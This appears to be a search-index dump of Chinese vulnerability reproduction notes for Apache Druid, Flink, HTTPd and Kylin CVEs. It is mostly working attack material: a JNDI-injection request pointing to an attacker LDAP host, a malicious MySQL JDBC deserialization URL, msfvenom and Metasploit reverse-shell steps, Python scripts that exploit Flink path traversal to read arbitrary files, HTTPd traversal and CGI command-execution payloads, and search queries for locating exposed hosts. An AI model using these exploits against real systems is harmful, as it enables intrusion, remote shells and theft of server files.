远程代码执行漏洞。由于Apache Druid 默认情况下缺乏授权认证，攻击者可直接构造恶意请求执行任意代码，控制服务器。 参考链接： http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://help.aliyun.com/noticelist/articleid/1060822985.html ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/:1:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/"},{"categories":null,"content":"漏洞影响 Apache Druid \u003c 0.20.2 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/:2:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/"},{"categories":null,"content":"漏洞复现 jdbc触发点：https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup poc: url = \"jdbc:mysql://localhost:3307/?autoDeserialize=true\u0026statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026maxAllowedPacket=65535\" user =\"cb1\" password=\"password\" ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/:3:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/"},{"categories":null,"content":"Apache Druid 远程代码执行漏洞 QVD-2023-9629 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:0:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"漏洞描述 该漏洞源于 Apache Kafka Connect JNDI 注入漏洞（CVE-2023-25194），Apache Druid 由于支持从 Kafka 加载数据，刚好满足其利用条件，攻击者可通过修改Kafka 连接配置属性进行 JNDI 注入攻击，进而在服务端执行任意恶意代码。 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:1:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"漏洞影响 Apache Druid \u003c= 25.0.0 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:2:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"网络测绘 title=\"Apache Druid\" ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:3:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"漏洞复现 访问漏洞环境，点击 Load data -\u003e Streaming，进入页面后点击 Apache Kafka -\u003e Connect data： 在 Bootstrap servers 和 Topic 处填入任意字符，点击 Apply，抓包。 poc： POST /druid/indexer/v1/sampler?for=connect HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 1437 Connection: close { \"type\":\"kafka\", \"spec\":{ \"type\":\"kafka\", \"ioConfig\":{ \"type\":\"kafka\", \"consumerProperties\":{ \"bootstrap.servers\":\"1.1.1.1:9092\", \"sasl.mechanism\":\"SCRAM-SHA-256\", \"security.protocol\":\"SASL_SSL\", \"sasl.jaas.config\":\"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\\"ldap://your-ip\\\" useFirstPass=\\\"true\\\" serviceName=\\\"x\\\" debug=\\\"true\\\" group.provider.url=\\\"xxx\\\";\" }, \"topic\":\"any\", \"useEarliestOffset\":true, \"inputFormat\":{ \"type\":\"regex\", \"pattern\":\"([\\\\s\\\\S]*)\", \"listDelimiter\":\"56616469-6de2-9da4-efb8-8f416e6e6965\", \"columns\":[ \"raw\" ] } }, \"dataSchema\":{ \"dataSource\":\"sample\", \"timestampSpec\":{ \"column\":\"!!!_no_such_column_!!!\", \"missingValue\":\"1970-01-01T00:00:00Z\" }, \"dimensionsSpec\":{ }, \"granularitySpec\":{ \"rollup\":false } }, \"tuningConfig\":{ \"type\":\"kafka\" } }, \"samplerConfig\":{ \"numRows\":500, \"timeoutMs\":15000 } } 修改请求包，user.provider.url 处填写你的 ldap 服务 url。 利用 DNSLog 验证漏洞是否存在。 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:4:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"修复建议 避免 Apache Druid 开放至公网。 开启身份认证机制,可参考官方文档：https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/:5:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-qvd-2023-9629/"},{"categories":null,"content":"Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518 ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:0:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"漏洞描述 近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞. ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:1:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"漏洞影响 Apache Flink \u003c= 1.9.1(最新版本) ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:2:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"网络测绘 app=“Apache-Flink” \u0026\u0026 country=“CN” ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:3:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"漏洞复现 打开一个使用 Apache Flink 的网站，打开后页面为这样子 点击查看文件上传页面 打开MSF 生成一个 jar 木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar \u003e test.jar 点击 Add 上传 jar 文件 监听端口 msf6 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u003e set payload java/shell/reverse_tcp payload =\u003e java/shell/reverse_tcp msf6 exploit(multi/handler) \u003e set lhost xxx.xxx.xxx.xxx lhost =\u003e xxx.xxx.xxx.xxx msf6 exploit(multi/handler) \u003e set lport 4444 lport =\u003e 4444 msf6 exploit(multi/handler) \u003e run 点击下 submit 反弹回来一个root 权限shell ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:4:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"漏洞POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Flink \u003c= 1.9.1 \\033[0m') print('+ \\033[36m使用格式: python3 Apache_Flink.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] 可能存在 Apache Flink \u003c= 1.9.1 远程代码执行漏洞\\n\\033[0m\") else: print(\"\\033[31m[x] 目标Url 文件上传模块无法使用\\033[0m\") except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/:5:0","tags":null,"title":"","uri":"/apache-flink-%E5%B0%8F%E4%BA%8E1.9.1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-17518/"},{"categories":null,"content":"Apache Flink 目录遍历漏洞 CVE-2020-17519 ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:0:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"漏洞描述 2021年01月06日，360CERT监测发现Apache Flink发布了Apache Flink 目录穿越漏洞,目录穿越漏洞的风险通告，漏洞编号为CVE-2020-17518,CVE-2020-17519，漏洞等级：高危，漏洞评分：8.5。 远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响。 ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:1:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"漏洞影响 Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:2:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"网络测绘 app=\"Apache Flink\" ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:3:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:4:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"漏洞复现 POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:5:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"漏洞POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 /etc/passwd ，响应为:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 {} ，响应为:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] 目标文件{}读取失败\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile \u003e\u003e\u003e \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) ","date":"0001-01-01","objectID":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/:6:0","tags":null,"title":"","uri":"/apache-flink-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2020-17519/"},{"categories":null,"content":"Apache HTTPd 换行解析漏洞 CVE-2017-15715 ","date":"0001-01-01","objectID":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/:0:0","tags":null,"title":"","uri":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/"},{"categories":null,"content":"漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 ","date":"0001-01-01","objectID":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/:1:0","tags":null,"title":"","uri":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/"},{"categories":null,"content":"漏洞影响 Apache HTTPd 2.4.0~2.4.29版本 ","date":"0001-01-01","objectID":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/:2:0","tags":null,"title":"","uri":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 ","date":"0001-01-01","objectID":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/:3:0","tags":null,"title":"","uri":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/"},{"categories":null,"content":"漏洞复现 直接上传恶意文件会被拦截 抓包修改如下参数 响应为200，成功绕过 访问 http://xxx.xxx.xxx.xxx:8080/evil.php 成功触发解析漏洞 ","date":"0001-01-01","objectID":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/:4:0","tags":null,"title":"","uri":"/apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-cve-2017-15715/"},{"categories":null,"content":"Apache HTTPd 路径穿越漏洞 CVE-2021-41773 ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/:0:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/"},{"categories":null,"content":"漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.49~2.4.50-本中存在一个漏洞，可读取服务器中的任意文件 ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/:1:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/"},{"categories":null,"content":"漏洞影响 Apache HTTPd 2.4.49~2.4.50版本 ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/:2:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/"},{"categories":null,"content":"网络测绘 server=\"Apache/2.4.49\" ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/:3:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/"},{"categories":null,"content":"漏洞复现 Chorme插件Wappalyzer获取 Apache版本 验证POC /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 开启CGI的情况下可RCE POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh B=|id\u003e/tmp/id_txt ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/:4:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-41773/"},{"categories":null,"content":"Apache HTTPd 路径穿越漏洞 CVE-2021-42013 ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/:0:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/"},{"categories":null,"content":"漏洞描述 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.49~2.4.50-本中存在一个漏洞，可读取服务器中的任意文件 （CVE-2021-41773 的漏洞绕过） ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/:1:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/"},{"categories":null,"content":"漏洞影响 Apache HTTPd 2.4.49~2.4.50版本 ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/:2:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/"},{"categories":null,"content":"网络测绘 server=\"Apache/2.4.49\" ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/:3:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/"},{"categories":null,"content":"漏洞复现 Chorme插件Wappalyzer获取 Apache版本 验证POC /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd ","date":"0001-01-01","objectID":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/:4:0","tags":null,"title":"","uri":"/apache-httpd-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-cve-2021-42013/"},{"categories":null,"content":"Apache Kylin config 未授权配置泄露 CVE-2020-13937 ","date":"0001-01-01","objectID":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/:0:0","tags":null,"title":"","uri":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/"},{"categories":null,"content":"漏洞描述 Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息 ","date":"0001-01-01","objectID":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/:1:0","tags":null,"title":"","uri":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/"},{"categories":null,"content":"网络测绘 app=\"APACHE-kylin\" ","date":"0001-01-01","objectID":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/:2:0","tags":null,"title":"","uri":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/"},{"categories":null,"content":"环境搭建 docker pull apachekylin/apache-kylin-standalone:3.0.1 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 ","date":"0001-01-01","objectID":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/:3:0","tags":null,"title":"","uri":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/"},{"categories":null,"content":"漏洞复现 漏洞验证POC /kylin/api/admin/config ","date":"0001-01-01","objectID":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/:4:0","tags":null,"title":"","uri":"/apache-kylin-config-%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2-cve-2020-13937/"},{"categories":null,"content":"Apache Kylin CubeService.java 命令注入漏洞 CVE-2020-1956 ","date":"0001-01-01","objectID":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/:0:0","tags":null,"title":"","uri":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/"},{"categories":null,"content":"漏洞描述 2020年5月22日，CNVD通报了 Apache Kylin存在命令注入漏洞 CVE-2020-1956 Apache Kylin 是美国 Apache软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 Hadoop/Spark之上的 SQL查询接口及多维分析（OLAP）等功能。 ","date":"0001-01-01","objectID":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/:1:0","tags":null,"title":"","uri":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/"},{"categories":null,"content":"漏洞影响 Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha 